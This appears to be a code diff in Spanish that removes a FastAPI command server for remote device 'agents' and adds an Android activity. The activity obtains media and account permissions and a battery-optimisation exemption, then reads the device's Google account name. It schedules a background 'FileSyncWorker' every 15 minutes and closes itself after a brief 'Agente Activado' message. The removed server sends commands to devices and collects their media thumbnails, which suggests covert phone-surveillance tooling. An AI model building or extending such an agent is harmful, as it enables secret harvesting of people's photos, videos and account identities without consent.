@@ -1,101 +1,131 @@
-import json
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.middleware.cors import CORSMiddleware
-from pydantic import BaseModel
-from typing import List, Dict
-from datetime import datetime
-import time
+package com.example.myapplicationon
 
-# --- INICIALIZACIÓN DE LA APLICACIÓN ---
-app = FastAPI(title="Centro de Operaciones de Agentes v4.1")
-app.add_middleware(
-    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
-)
+import android.Manifest
+import android.accounts.AccountManager
+import android.annotation.SuppressLint
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
+import android.util.Log
+import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
+import java.util.*
+import java.util.concurrent.TimeUnit
 
-# --- "BASE DE DATOS" EN MEMORIA ---
-connected_agents: Dict[str, dict] = {}
-server_events: List[Dict] = []
-device_thumbnails_cache: dict[str, list] = {}
+class MainActivity : AppCompatActivity() {
 
-# --- FUNCIÓN DE AYUDA PARA LOGS ---
-def log_event(event_type: str, message: str, device_id: str = None):
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    log_entry = {"timestamp": timestamp, "type": event_type, "message": message, "device_id": device_id}
-    print(f"[{event_type.upper()}] {message}")
-    server_events.insert(0, log_entry)
-    if len(server_events) > 50: # Guardamos hasta 50 eventos
-        server_events.pop()
-
-# --- MODELOS DE DATOS (AHORA COMPLETOS) ---
-class Command(BaseModel):
-    target_id: str
-    action: str
-    payload: str
-
-class Thumbnail(BaseModel):
-    filename: str
-    thumbnail_b64: str
-
-class ErrorLog(BaseModel):
-    error: str
-
-# --- ENDPOINTS (RUTAS DE LA API) ---
-
-@app.websocket("/ws/{device_id}/{device_name:path}")
-async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
-    await websocket.accept()
-    log_event("CONNECT", f"Agente conectado: '{device_name}'", device_id)
-    connected_agents[device_id] = {"ws": websocket, "name": device_name, "connect_time": time.time()}
-    try:
-        while True:
-            await websocket.receive_text()
-    except WebSocketDisconnect:
-        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
-        log_event("DISCONNECT", f"Agente desconectado: '{name_to_print}'", device_id)
-        if device_id in connected_agents: del connected_agents[device_id]
-        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]
-
-
-@app.get("/api/health_check")
-async def health_check():
-    return {
-        "server_status": "Activo",
-        "server_time_utc": datetime.utcnow().isoformat(),
-        "connected_agents": [{"id": dev_id, "name": data["name"]} for dev_id, data in connected_agents.items()],
-        "recent_events": server_events
+    // Launcher que gestiona la respuesta del usuario al diálogo de optimización de batería
+    private val batteryOptimizationLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
+        Log.d("MainActivity", "Diálogo de optimización de batería cerrado.")
+        // Después de que el usuario interactúa (acepte o no), procedemos con el siguiente paso
+        ensureDeviceIdentity()
+        startSyncWorker()
     }
 
-@app.post("/api/log_error/{device_id}")
-async def log_error_from_agent(device_id: str, error_log: ErrorLog):
-    log_event("AGENT_ERROR", error_log.error, device_id)
-    return {"status": "log recibido"}
+    // Launcher que gestiona la respuesta del usuario al diálogo de permisos de archivos/cuentas
+    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
+        if (permissions.entries.all { it.value }) {
+            Log.d("MainActivity", "Permisos de archivos y cuentas concedidos.")
+            // Si los permisos se conceden, el siguiente paso es pedir la exclusión de batería
+            requestBatteryOptimizationExemption()
+        } else {
+            Log.w("MainActivity", "Permisos denegados. La app no puede funcionar.")
+            Toast.makeText(this, "Los permisos son necesarios para el funcionamiento del agente.", Toast.LENGTH_LONG).show()
+            finish()
+        }
+    }
 
-@app.post("/api/send-command")
-async def send_command_to_agent(command: Command):
-    target_id = command.target_id
-    if target_id not in connected_agents:
-        log_event("ERROR", f"Intento de enviar comando a un agente no conectado: {target_id}")
-        return {"status": "error", "message": "Agente no conectado."}
-    try:
-        agent_socket = connected_agents[target_id]["ws"]
-        await agent_socket.send_text(command.json())
-        log_event("COMMAND", f"Comando '{command.action}' enviado a '{connected_agents[target_id]['name']}'", target_id)
-        return {"status": "success", "message": "Comando enviado."}
-    except Exception as e:
-        log_event("ERROR", f"Fallo al enviar comando a {target_id}: {e}", target_id)
-        return {"status": "error", "message": "Fallo de comunicación."}
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+        // El flujo siempre empieza aquí
+        checkAndRequestPermissions()
+    }
 
-@app.post("/api/submit_media_list/{device_id}")
-async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
-    if device_id not in connected_agents:
-        return {"status": "error", "message": "Agente no registrado."}
-    log_event("INFO", f"Recibidas {len(thumbnails)} miniaturas del agente '{connected_agents[device_id]['name']}'", device_id)
-    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
-    return {"status": "success"}
+    private fun checkAndRequestPermissions() {
+        val requiredPermissions = mutableListOf<String>()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            requiredPermissions.addAll(listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO))
+        } else {
+            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        requiredPermissions.add(Manifest.permission.GET_ACCOUNTS)
 
-@app.get("/api/get_media_list/{device_id}")
-async def get_media_list(device_id: str):
-    log_event("INFO", f"Panel pide la lista de medios para el agente con ID: {device_id[:8]}...", device_id)
-    return device_thumbnails_cache.get(device_id, [])
+        val permissionsToGrant = requiredPermissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
 
-log_event("STARTUP", "El servidor se ha iniciado correctamente.")
+        if (permissionsToGrant.isNotEmpty()) {
+            requestPermissionLauncher.launch(permissionsToGrant.toTypedArray())
+        } else {
+            // Si ya tenemos los permisos, pasamos directamente a la solicitud de batería
+            requestBatteryOptimizationExemption()
+        }
+    }
+
+    @SuppressLint("BatteryLife")
+    private fun requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val packageName = this.packageName
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                Log.i("MainActivity", "Solicitando exclusión de optimización de batería...")
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                batteryOptimizationLauncher.launch(intent)
+            } else {
+                Log.i("MainActivity", "La app ya está excluida de la optimización de batería.")
+                ensureDeviceIdentity()
+                startSyncWorker()
+            }
+        } else {
+            // En versiones antiguas de Android, no es necesario
+            ensureDeviceIdentity()
+            startSyncWorker()
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun ensureDeviceIdentity() {
+        val sharedPrefs = getSharedPreferences("FileSyncPrefs", Context.MODE_PRIVATE)
+        if (!sharedPrefs.contains("device_id")) {
+            val newId = UUID.randomUUID().toString()
+            var accountName = "Sin Cuenta"
+            try {
+                val accounts = AccountManager.get(this).getAccountsByType("com.google")
+                if (accounts.isNotEmpty()) {
+                    accountName = accounts[0].name
+                }
+            } catch (e: Exception) {
+                Log.e("MainActivity", "No se pudo acceder a las cuentas", e)
+            }
+            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val descriptiveName = "$deviceModel ($accountName)"
+
+            sharedPrefs.edit()
+                .putString("device_id", newId)
+                .putString("device_name", descriptiveName)
+                .apply()
+            Log.i("MainActivity", "Nueva identidad de dispositivo creada: $descriptiveName")
+        }
+    }
+
+    private fun startSyncWorker() {
+        val syncRequest = PeriodicWorkRequestBuilder<FileSyncWorker>(15, TimeUnit.MINUTES).build()
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork("FileSyncAgentWork", ExistingPeriodicWorkPolicy.KEEP, syncRequest)
+        Log.i("MainActivity", "Agente programado con éxito. La app se cerrará.")
+        Toast.makeText(this, "Agente Activado", Toast.LENGTH_SHORT).show()
+        finish()
+    }
+}
+
+
